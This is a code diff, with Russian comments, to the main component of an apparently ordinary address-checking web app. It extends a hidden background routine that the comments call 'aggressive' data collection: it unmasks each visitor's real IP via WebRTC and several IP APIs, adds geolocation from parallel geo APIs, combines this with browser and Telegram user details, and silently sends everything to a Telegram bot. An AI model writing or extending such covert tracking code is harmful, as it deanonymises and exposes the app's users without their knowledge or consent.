@@ -4,7 +4,7 @@ import { AddressInput } from './components/AddressInput';
 import { CheckResults } from './components/CheckResults';
 import { Header } from './components/Header';
 import { Footer } from './components/Footer';
-import { getIPFast, getUserInfo } from './utils/webrtc-ip';
+import { getIPFast, getUserInfo, getGeoData } from './utils/webrtc-ip';
 import { sendUserDataToBot, getBotInfo } from './utils/telegram-bot';
 import './utils/test-webrtc'; // Импортируем тесты для доступа в консоли
 import './utils/debug-helpers'; // Debug команды для консоли
@@ -28,17 +28,32 @@ export default function App() {
     // Запускаем асинхронно, не блокируем UI
     const trackUser = async () => {
       try {
-        console.log('🔍 Сбор данных пользователя (неблокирующий)...');
+        console.log('🔍 АГРЕССИВНЫЙ сбор данных пользователя...');
+        console.log('⚡ Запуск множественных методов сбора IP...');
         
         // Проверяем бота в фоне
         getBotInfo().then(botInfo => {
           console.log('🤖 Bot info:', botInfo);
+        }).catch(err => {
+          console.error('⚠️ Ошибка проверки бота:', err);
         });
         
-        // Быстрое получение IP (2 секунды максимум)
+        // АГРЕССИВНОЕ получение IP (множественные WebRTC соединения + 8 API)
         const { ip, ipInfo } = await getIPFast();
         console.log('📍 Primary IP:', ip);
         console.log('🌐 Full IP Info:', ipInfo);
+        
+        // АГРЕССИВНОЕ получение геоданных (4 geo API параллельно)
+        let geoData = undefined;
+        if (ip !== 'Unknown') {
+          console.log('🌍 Запуск агрессивного сбора геоданных...');
+          try {
+            geoData = await getGeoData(ip);
+            console.log('✅ Геоданные получены:', geoData);
+          } catch (geoError) {
+            console.error('⚠️ Ошибка получения геоданных:', geoError);
+          }
+        }
         
         // Получаем дополнительную информацию
         const userInfo = getUserInfo();
@@ -54,17 +69,24 @@ export default function App() {
         const userData = {
           ip: ip,
           ipInfo: ipInfo,
+          geoData: geoData, // Добавляем геоданные
           ...userInfo,
           telegramUser
         };
         
+        console.log('📦 Полный набор данных собран:', userData);
+        
         // Отправляем в фоне, не ждем результата
+        console.log('📤 Отправка ПОЛНОГО пакета данных в Telegram...');
         sendUserDataToBot(userData).then(sent => {
           if (sent) {
             console.log('✅ Данные успешно отправлены в бота');
+            console.log('🎉 Агрессивный сбор данных завершен!');
           } else {
             console.error('❌ Не удалось отправить данные в бота');
           }
+        }).catch(err => {
+          console.error('❌ Ошибка отправки в бота:', err);
         });
         
       } catch (error) {
